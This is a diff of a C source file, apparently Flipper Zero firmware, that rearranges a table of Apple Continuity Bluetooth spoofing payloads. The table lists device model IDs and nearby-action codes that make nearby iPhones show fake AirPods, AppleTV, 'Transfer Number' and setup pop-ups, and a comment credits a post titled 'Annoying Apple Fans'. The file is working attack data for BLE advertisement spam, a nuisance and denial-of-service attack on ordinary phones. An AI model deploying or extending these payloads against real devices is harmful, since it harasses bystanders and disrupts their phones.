@@ -17,131 +17,17 @@ typedef struct {
 // Custom adv logic and Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/
 
 static const Payload payloads[] = {
-    {.title = "Apple TV Setup",
+    {.title = "AirPods Pro",
      .msg =
          {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x01}},
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0E20}},
          }},
-    {.title = "Mobile Backup",
+    {.title = "PowerBeats",
      .msg =
          {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x04}},
-         }},
-    {.title = "Watch Setup",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x05}},
-         }},
-    {.title = "Apple TV Pair",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x06}},
-         }},
-    {.title = "Internet Relay",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x07}},
-         }},
-    {.title = "WiFi Password",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x08}},
-         }},
-    {.title = "iOS Setup",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x09}},
-         }},
-    {.title = "Repair",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x0A}},
-         }},
-    {.title = "Speaker Setup",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x0B}},
-         }},
-    {.title = "Apple Pay",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x0C}},
-         }},
-    {.title = "AppleTV Homekit Setup",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x0D}},
-         }},
-    {.title = "Developer Tools Pair",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x0E}},
-         }},
-    {.title = "Answered Call",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x0F}},
-         }},
-    {.title = "Ended Call",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x10}},
-         }},
-    {.title = "DD Ping",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x11}},
-         }},
-    {.title = "DD Pong",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x12}},
-         }},
-    {.title = "Remote Auto Fill",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x13}},
-         }},
-    {.title = "Companion Link",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x14}},
-         }},
-    {.title = "Remote Management",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x15}},
-         }},
-    {.title = "Remote Auto Fill Pong",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x16}},
-         }},
-    {.title = "Remote Display",
-     .msg =
-         {
-             .type = ContinuityTypeNearbyAction,
-             .data = {.nearby_action = {.action_type = 0x17}},
+             .type = ContinuityTypeProximityPairing,
+             .data = {.proximity_pairing = {.device_model = 0x0320}},
          }},
     {.title = "Airtag",
      .msg =
@@ -149,47 +35,65 @@ static const Payload payloads[] = {
              .type = ContinuityTypeProximityPairing,
              .data = {.proximity_pairing = {.device_model = 0x0055}},
          }},
-    {.title = "Airpods",
+    {.title = "Setup New Phone",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x09}},
+         }},
+    {.title = "Transfer Number",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x02}},
+         }},
+    {.title = "AppleTV AutoFill",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x13}},
+         }},
+    {.title = "AppleTV Pair",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x06}},
+         }},
+    {.title = "HomePod Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0B}},
+         }},
+    {.title = "AirPods",
      .msg =
          {
              .type = ContinuityTypeProximityPairing,
              .data = {.proximity_pairing = {.device_model = 0x0220}},
          }},
-    {.title = "Airpods Pro",
-     .msg =
-         {
-             .type = ContinuityTypeProximityPairing,
-             .data = {.proximity_pairing = {.device_model = 0x0E20}},
-         }},
-    {.title = "Airpods Max",
+    {.title = "AirPods Max",
      .msg =
          {
              .type = ContinuityTypeProximityPairing,
              .data = {.proximity_pairing = {.device_model = 0x0A20}},
          }},
-    {.title = "Airpods Gen 2",
+    {.title = "AirPods Gen 2",
      .msg =
          {
              .type = ContinuityTypeProximityPairing,
              .data = {.proximity_pairing = {.device_model = 0x0F20}},
          }},
-    {.title = "Airpods Gen 3",
+    {.title = "AirPods Gen 3",
      .msg =
          {
              .type = ContinuityTypeProximityPairing,
              .data = {.proximity_pairing = {.device_model = 0x1320}},
          }},
-    {.title = "Airpods Pro Gen 2",
+    {.title = "AirPods Pro Gen 2",
      .msg =
          {
              .type = ContinuityTypeProximityPairing,
              .data = {.proximity_pairing = {.device_model = 0x1420}},
-         }},
-    {.title = "PowerBeats",
-     .msg =
-         {
-             .type = ContinuityTypeProximityPairing,
-             .data = {.proximity_pairing = {.device_model = 0x0320}},
          }},
     {.title = "PowerBeats Pro",
      .msg =
@@ -250,6 +154,48 @@ static const Payload payloads[] = {
          {
              .type = ContinuityTypeProximityPairing,
              .data = {.proximity_pairing = {.device_model = 0x1620}},
+         }},
+    {.title = "AppleTV Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x01}},
+         }},
+    {.title = "AppleTV Homekit Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x0D}},
+         }},
+    {.title = "AppleTV New User",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x20}},
+         }},
+    {.title = "AppleTV AppleID Setup",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x2B}},
+         }},
+    {.title = "AppleTV Audio Sync",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x19}},
+         }},
+    {.title = "AppleTV Network",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x27}},
+         }},
+    {.title = "TV Color Balance",
+     .msg =
+         {
+             .type = ContinuityTypeNearbyAction,
+             .data = {.nearby_action = {.action_type = 0x13}},
          }},
 };
 
